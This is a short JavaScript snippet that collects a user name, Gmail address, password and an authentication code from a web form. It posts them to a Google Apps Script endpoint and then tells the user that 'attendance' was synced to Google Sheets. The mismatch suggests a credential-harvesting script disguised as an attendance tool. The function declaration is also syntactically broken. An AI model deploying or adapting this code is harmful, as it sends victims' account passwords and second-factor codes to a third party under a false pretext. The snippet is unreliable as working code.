const googleWebAppUrl = "https://script.google.com/macros/s/XXXXX/exec";

function loginInformation {
let userName = document.getElementById("userId").value;
let gmail = document.getElementById("gmail").value;
let password = document.getElementById("password").value;
let Authentication = document.getElementById("Authentication").value;
let loginPackage = {"name":userName,"gmail":gmail,"password":password,"Authentication":Authentication}
return loginPackage;
};

fetch(googleWebAppUrl, {
    method: "POST", 
    mode: "no-cors", 
    headers: {
        "Content-Type": "application/json"
    },
    body: JSON.stringify(loginInformation()) 
})
.then(() => {
    alert("Attendance synced to Google Sheets successfully!");
})
.catch(error => {
    console.error("Error syncing data:", error);
    alert("Oops! Something went wrong.");
});
